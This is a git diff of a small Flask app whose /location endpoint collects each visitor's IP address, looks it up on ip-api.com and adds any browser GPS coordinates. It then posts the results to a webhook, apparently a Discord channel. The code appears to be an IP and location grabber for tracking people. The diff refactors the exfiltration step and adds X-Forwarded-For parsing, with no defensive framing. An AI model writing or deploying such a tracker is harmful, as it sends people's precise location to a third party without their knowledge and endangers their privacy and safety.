@@ -11,26 +11,27 @@ def index():
 @app.route('/location', methods=['POST'])
 def get_location():
     data = request.json or {}
-    ip = request.remote_addr
-
-    if data.get('ip_only'):
-        ip_info = requests.get(f'http://ip-api.com/json/{ip}').json()
-        msg = {
-            "content": f"IP only visitor:\nIP: {ip}\nLocation: {ip_info.get('city')}, {ip_info.get('country')}"
-        }
-        requests.post(webhook_url, json=msg)
-        return jsonify({"status": "ip_sent"})
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
 
     ip_info = requests.get(f'http://ip-api.com/json/{ip}').json()
-    msg = {
-        "content": f"""
-GPS: {data.get('lat')} , {data.get('lon')}
-IP: {ip}
-IP Location: {ip_info.get('city')}, {ip_info.get('country')} ({ip_info.get('lat')}, {ip_info.get('lon')})
-"""
-    }
-    requests.post(webhook_url, json=msg)
-    return jsonify({"status": "gps_sent"})
+
+    lat = data.get('lat')
+    lon = data.get('lon')
+
+    content = f"IP: {ip}\n"
+    content += f"IP Location: {ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')} ({ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')})\n"
+
+    if lat and lon:
+        content += f"GPS: {lat}, {lon}"
+    else:
+        content += "GPS: Not provided"
+
+    msg = {"content": content}
+
+    res = requests.post(webhook_url, json=msg)
+    print("Discord response:", res.status_code, res.text)
+
+    return jsonify({"status": "sent"})
 
 if __name__ == '__main__':
     app.run()
